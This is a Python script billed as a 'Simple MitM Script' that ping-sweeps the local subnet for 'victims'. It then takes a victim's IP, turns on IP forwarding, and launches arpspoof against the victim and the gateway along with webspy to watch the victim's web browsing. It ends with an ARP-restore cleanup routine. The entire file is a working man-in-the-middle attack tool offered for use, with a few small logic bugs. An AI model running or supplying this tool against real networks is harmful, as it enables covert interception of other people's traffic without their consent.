#! /usr/bin/env python
#
#
# Written by mr.read 17-03-2017

from __future__ import print_function
from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)
from scapy.all import *
from commands import getoutput
from multiprocessing import Process
from subprocess import call
from os import system
from time import sleep
from atexit import register
import sys, socket, struct

Escape = "\033"
Lred = "[91m"
Lgre = "[92m"
Lyel = "[93m"
Lcyan = "[96m"


class PING_SWEEP(object):

  def __init__(self):
    self.ping_sweeper.__init__(self)

    @register
    def clean_up():
      print("[*] Cleaning up!")
      print(Escape + Lred + "[!] Exiting...")

  def pinger(self, host_num):
    hostadrr = get_if_addr(conf.iface).split('.')[:-1]
    hostadrr = '.'.join(hostadrr) + '.' + repr(host_num)
    line = getoutput("ping -n -c 1 %s 2> /dev/null" % hostadrr)

    while True:
      if line.find(hostadrr) and line.find("bytes from") > -1:  # Victim Active
        is_active = []
        is_active.append(hostadrr)
        alive_host = is_active.pop()
        print("    {0}".format(Escape + Lgre + "[+] Victim %s is Active" %
                              alive_host))
        break
      else:
        sys.exit(0)

  def ping_sweeper(self):
    for host_num in range(1, 255):
      ping = Process(target=self.pinger, args=(host_num,))
      ping.start()


class MitM(object):

  def __init__(self):
    self.victimIP = raw_input(Escape + Lyel +
                              "\n[*] Enter Victim's IP Address [?] ")
    self.gateIP = self.get_default_gateway_linux()
    self.interface = conf.iface

  def get_mac(self, ip):
    arp = getoutput('arp -n').split()
    mac_address = arp[arp.index(ip) + 2]
    return mac_address

  def get_default_gateway_linux(self):
    with open("/proc/net/route") as route:
      for line in route:
        fields = line.strip().split()
        if fields[1] != '00000000' or not int(fields[3], 16) & 2:
          continue
        return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

  def reARP(self):
    print("\n[*] Restoring Target...")
    system("screen -ls |egrep '(arpspoof|webspy)' |cut -d. -f1 \
           |awk '{print $1}' | xargs kill")
    send(
        ARP(op=2,
            pdst=self.gateIP,
            psrc=self.victimIP,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=self.victimMAC),
        count=7)
    send(
        ARP(op=2,
            pdst=self.victimIP,
            psrc=self.gateIP,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=self.gateMAC),
        count=7)
    print(Escape + Lred + "[!] Shutting Down...")
    system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.exit(0)

  def mitm(self):
    try:
      self.victimMAC = self.get_mac(self.victimIP)
    except Exception:
      print("[-] Couldn't Find Victim MAC Address")
      sys.exit(1)
    try:
      self.gateMAC = self.get_mac(self.gateIP)
    except Exception:
      print("[-] Couldn't Find Gateway MAC Address")
      sys.exit(1)
    try:
      print(Escape + Lgre + "\n[-] Poisoning Target...")
      system("echo 1 > /proc/sys/net/ipv4/ip_forward")
      print(Escape + Lgre + "[+] Target " + Escape + Lred + "%s" % self.victimIP
            + Escape + Lgre + " Poisoned!")
      print(Escape + Lyel + "[*] Your %s box interface is %s" % (
          socket.gethostname(), self.interface))
      print(Escape + Lgre + "[*] Press Ctrl+C to cleanly shutdown.")
      call(["screen", "-dmS", "arpspoof", "arpspoof", "-i", self.interface,
            "-t", self.victimIP, self.gateIP])
      call(["screen", "-dmS", "webspy", "webspy", "-i", self.interface,
            self.victimIP])
      call(["xterm", "-e", "arpspoof", "-i", self.interface, "-t", self.gateIP,
            self.victimIP])
    except KeyboardInterrupt:
      self.reARP()
      sys.exit(1)


if __name__ == '__main__':
  try:
    raw_input
  except NameError:
    raw_input = input
  try:
    print(Escape + Lcyan + '''
    MP""""""`MM M"""""`'"""`YM MP""""""`MM
    M  mmmmm..M M  mm.  mm.  M M  mmmmm..M
    M.      `YM M  MMM  MMM  M M.      `YM
    MMMMMMM.  M M  MMM  MMM  M MMMMMMM.  M
    M. .MMM'  M M  MMM  MMM  M M. .MMM'  M
    Mb.     .dM M  MMM  MMM  M Mb.     .dM
    MMMMMMMMMMM MMMMMMMMMMMMMM MMMMMMMMMMM \n''')
    print("    {0}".format("Simple MitM Script [SMS] By:mr.raedCTD \n"))
    try:
      run_scan = ('y', 'Y', 'yes', 'Yes', 'YES')
      scan_victims = raw_input(Escape + Lyel +
                               "[*] Do you want to scan for victims? (y/n): ")
      if scan_victims not in run_scan:
        pass
      else:
        sys.tracebacklimit = 0
        print(Escape + Lyel +
              "[*] Scanning for Victim IP Address, please wait...\n")
        PING_SWEEP().ping_sweeper()
        sleep(4)
    except KeyboardInterrupt:
      sys.exit(1)
    MitM().mitm()
  except KeyboardInterrupt:
    print("\n[-] User Requested to Abort!")
    sys.exit(1)
